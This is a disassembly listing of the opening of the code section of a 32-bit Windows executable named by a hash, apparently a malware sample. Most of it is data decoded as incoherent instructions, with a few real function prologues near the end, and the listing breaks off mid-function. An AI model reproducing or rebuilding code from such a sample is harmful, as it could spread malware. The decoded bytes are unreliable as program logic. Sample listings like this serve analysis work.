
5a7d89aed2dbfa7eefe1287c3b354ef70b3a7e9ee6c06a1a3706977400758e9b.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    esp,0xcce6af8e
  4d0005:	ror    DWORD PTR [edx],1
  4d0007:	in     al,0x4f
  4d0009:	sbb    dl,BYTE PTR [esp+eax*2]
  4d000c:	push   ecx
  4d000d:	fst    DWORD PTR [ebx]
  4d000f:	les    esi,FWORD PTR [edx+0x13]
  4d0012:	icebp  
  4d0013:	test   DWORD PTR ds:0x24bab6b0,ebp
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d06a1
  4d06c1:	inc    esp
  4d06c2:	xchg   ebp,eax
  4d06c3:	mov    bl,0x1f
  4d06c5:	sbb    DWORD PTR [ebp-0xf],esi
  4d06c8:	loope  0x4d06cb
  4d06ca:	in     eax,dx
  4d06cb:	xchg   edi,eax
  4d06cc:	(bad)  
  4d06ce:	loopne 0x4d06bf
  4d06d0:	icebp  
  4d06d1:	imul   ebx,esp,0x672e4685
  4d06d7:	cli    
  4d06d8:	(bad)  
  4d06da:	or     BYTE PTR [edx-0x7d],bh
  4d06dd:	ret    0x7de3
  4d06e0:	ins    BYTE PTR es:[edi],dx
  4d06e1:	loopne 0x4d06e7
  4d06e3:	mov    ebp,0x1cd5f99f
  4d06e8:	push   edi
  4d06e9:	pop    eax
  4d06ea:	inc    ebx
  4d06eb:	sub    al,0x8b
  4d06ed:	call   DWORD PTR [ebp-0x75]
  4d06f0:	in     al,dx
  4d06f1:	sub    esp,0x2c
  4d06f4:	mov    edx,0x4d31e4
  4d06f9:	add    DWORD PTR [ebp-0x28],0xffffff89
  4d06fd:	push   edx
  4d06fe:	push   0x0
  4d0700:	call   0x4d1000
  4d0705:	add    esp,0x4
  4d0708:	pop    edx
  4d0709:	push   edx
  4d070a:	push   edi
  4d070b:	push   eax
  4d070c:	push   eax
  4d070d:	push   esi
  4d070e:	call   0x4d1030
  4d0713:	add    esp,0x10
  4d0716:	pop    edx
  4d0717:	push   edx
  4d0718:	call   0x4d1024
  4d071d:	add    esp,0x4
  4d0720:	pop    edx
  4d0721:	add    esp,0x2c
  4d0724:	pop    ebp
  4d0725:	ret    
  4d0726:	add    BYTE PTR [eax],al
  4d0728:	mov    edi,edi
  4d072a:	push   ebp
  4d072b:	mov    ebp,esp
  4d072d:	sub    esp,0x30
  4d0730:	lea    ebx,ds:0x4d302c
  4d0736:	xor    edx,DWORD PTR [ebx+0x1c4]
  4d073c:	push   ebx
  4d073d:	push   DWORD PTR [ebx+0x54]
  4d0740:	push   DWORD PTR [ebx+0x30]
  4d0743:	call   0x4d1154
  4d0748:	add    esp,0x8
  4d074b:	pop    ebx
  4d074c:	mov    eax,0x0
  4d0751:	push   eax
  4d0752:	call   0x4d0870
  4d0757:	add    esp,0x4
  4d075a:	push   0x0
  4d075c:	call   0x4d0870
  4d0761:	add    esp,0x4
  4d0764:	add    esp,0x30
  4d0767:	pop    ebp
  4d0768:	ret    
  4d0769:	add    BYTE PTR [eax],al
  4d076b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0771:	sub    esp,0x40
  4d0774:	mov    esi,0x4d3140
  4d0779:	cmp    esi,0x691f
  4d077f:	jb     0x4d076f
  4d0781:	push   esi
  4d0782:	push   DWORD PTR [esi+0x1ec]
  4d0788:	push   DWORD PTR [esi+0xc8]
  4d078e:	call   0x4d0c8c
